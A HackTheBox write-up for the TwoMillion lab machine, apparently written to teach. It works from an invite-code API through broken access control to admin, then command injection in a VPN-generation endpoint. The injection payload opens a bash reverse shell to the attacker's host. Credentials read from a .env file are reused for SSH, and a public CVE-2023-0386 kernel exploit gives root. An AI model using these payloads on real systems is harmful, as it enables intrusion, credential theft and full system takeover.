# TwoMillion – HackTheBox Writeup

**Target:** TwoMillion (2million.htb)  
**Attacker:** Kali Linux  
**OS:** Linux (Ubuntu 22.04)  
**Difficulty:** Easy  
**Attack Path:** Invite Code Challenge → API Enumeration → Privilege Escalation → Command Injection → Kernel Exploit

## Recon

### Port Scan

Started with a basic nmap to see what's running:

```bash
nmap -sV -sC -oN nmap.txt 2million.htb
```

Only two services are up. SSH on port 22 and HTTP on port 80. The web server immediately redirects everything to `2million.htb` so you need to add that to your hosts file:

```bash
echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
```

### The Website

Most of the navigation links are dead. They all point to anchors on the same page like `2million.htb/#about` or `2million.htb/#subscribe`. The only interesting page is `/invite` which asks for an invite code. No obvious way to get one though.

### Finding the Invite System

The invite page loads some JavaScript files. One of them is called `inviteapi.min.js` which sounds promising. Checked the source and found this packed JavaScript:

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

That's obfuscated with Dean Edwards' packer. The readable strings are at the end in the split array. You can see words like `invite`, `generate`, `verify`, and API endpoints.

### Unpacking the Code

Threw the packed code into the browser console but replaced `eval` with `console.log` to see what it actually does:

```javascript
console.log(function(p,a,c,k,e,d){...})
```

Got back two functions:

```javascript
function verifyInviteCode(code) {
    var formData = {"code": code};
    $.ajax({
        type: "POST",
        dataType: "json", 
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) { console.log(response) },
        error: function(response) { console.log(response) }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) { console.log(response) },
        error: function(response) { console.log(response) }
    })
}
```

So there's an API endpoint that tells you how to generate invite codes. The name gives it away completely.

## Getting an Account

### Following the Breadcrumbs

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

ROT13 is just Caesar cipher with a shift of 13. Decoded it says "In order to generate the invite code, make a POST request to /api/v1/invite/generate". So that's the next step:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
```

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "TVFJODAtT1lUQTgtMlVPR0stUThNWkU=",
    "format": "encoded"
  }
}
```

That's Base64. Decoded it:

```bash
echo "TVFJODAtT1lUQTgtMlVPR0stUThNWkU=" | base64 -d
```

Got a proper invite code in the format `XXXXX-XXXXX-XXXXX-XXXXX`. Used that on the invite page to register a new account.

### Getting the API Documentation

After registering and logging in, now I had a valid session cookie. The real goal here is to find out what API endpoints exist. Since I'm authenticated now, tried hitting the base API endpoint:

```bash
curl -s http://2million.htb/api/v1 -b "PHPSESSID=<my-session-cookie>" | jq
```

This gives you the complete API documentation in JSON format. All the routes, what they do, which HTTP methods they accept. The important thing is there's an admin section with three endpoints:

```json
"admin": {
  "GET": {
    "/api/v1/admin/auth": "Check if user is admin"
  },
  "POST": {
    "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
  },
  "PUT": {
    "/api/v1/admin/settings/update": "Update user settings"
  }
}
```

## Privilege Escalation

### Testing Admin Access

First checked if I'm admin:

```bash
curl -s http://2million.htb/api/v1/admin/auth -b "PHPSESSID=<cookie>" | jq
```

```json
{
  "message": false
}
```

Not admin yet. But notice the "Update user settings" endpoint. That's interesting. What settings can you update exactly?

### Broken Access Control

Tried calling the admin settings endpoint as a regular user to see what happens:

```bash
curl -i -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=<cookie>" \
  -H "Content-Type: application/json" \
  -d '{}'
```

Got back HTTP 200 with `{"status":"danger","message":"Missing parameter: email"}`. That's huge. A regular user can call an admin endpoint and the API is telling me what parameters it wants. This is classic broken access control.

Added the email parameter (my registration email):

```bash
curl -i -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=<cookie>" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'
```

Now it said `{"status":"danger","message":"Missing parameter: is_admin"}`. The API is literally asking me to specify whether I want to be admin or not. That's the vulnerability right there.

```bash
curl -i -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=<cookie>" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","is_admin":1}'
```

Success response. Verified with the auth endpoint and now it returned `{"message": true}`. I'm admin.

## Command Injection

### Finding the Vulnerable Endpoint

Now that I have admin access, I can use the VPN generation endpoint. This is where command injection typically happens because generating VPN configs usually involves calling external tools or shell scripts.

```bash
curl -i -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=<cookie>" \
  -H "Content-Type: application/json" \
  -d '{}'
```

Missing username parameter. Tried with a normal username first:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=<cookie>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test"}'
```

That worked and returned what looked like VPN configuration data. Now for the injection test:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=<cookie>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test && id"}'
```

The response was different. The command executed but I couldn't see the output. Set up a netcat listener and tried with curl to confirm:

```bash
nc -lvnp 4444
```

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=<cookie>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test && curl 10.10.XX.XX:4444"}'
```

Got a connection. Confirmed command injection.

### Reverse Shell

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=<cookie>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test && bash -c \"bash -i >& /dev/tcp/10.10.XX.XX/4444 0>&1\""}'
```

Shell popped. I'm `www-data`.

## User Access

### Database Credentials

Looked around the web root for config files:

```bash
ls -la /var/www/html/
```

Found a `.env` file which is the standard place for environment variables in PHP applications:

```bash
cat /var/www/html/.env
```

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod  
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

That's database credentials with username `admin` and password `SuperDuperPass123`. Password reuse is extremely common so tried those for SSH:

```bash
ssh admin@2million.htb
```

Used the password `SuperDuperPass123` and got in. User flag is in the home directory:

```bash
cat ~/user.txt
```

## Root Access

### Enumeration

Standard privilege escalation checks:

```bash
sudo -l
# User admin may not run sudo on localhost.

uname -a
# Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

ls -la /var/mail/
cat /var/mail/admin
```

The mail was the important clue:

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700

Hey admin,
I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
HTB Godfather
```

The mail specifically mentions OverlayFS/FUSE vulnerabilities and the kernel version is from September 2022. That's CVE-2023-0386.

### Kernel Exploit

Grabbed the exploit from GitHub:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386.git
scp -r CVE-2023-0386 admin@2million.htb:/tmp/
```

On the box:

```bash
cd /tmp/CVE-2023-0386
make all
```

This exploit requires two terminals. In the first one:

```bash
./fuse ./ovlcap/lower ./gc
```

That starts the FUSE filesystem and waits. In a second SSH session:

```bash
cd /tmp/CVE-2023-0386
./exp
```

Got a root shell. Root flag:

```bash
cat /root/root.txt
```

## What I Learned

The old HTB invite challenge was actually a nice introduction to API enumeration. The JavaScript contained all the clues you needed but you had to unpack and read it first.

APIs that return detailed error messages are goldmines for enumeration. The "Missing parameter" responses from the admin endpoint told me exactly what the request should look like.

Broken access control is still everywhere. Just because an endpoint has "admin" in the path doesn't mean the authorization is properly implemented. Always test what happens when you call admin functions as a regular user.

Command injection often happens where user input gets passed to system commands. VPN generation, file processing, anything that might call external tools is worth testing.

Environment files like `.env` are treasure troves of credentials. Always check for them in web application directories.

Password reuse between database accounts and system accounts is extremely common. If you find DB credentials, always try them for SSH or other services.

Kernel exploits are still a thing. When you see old kernel versions and there's a hint about recent CVEs, that's probably your escalation path. The mail in this box literally told you which vulnerability family to look for.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
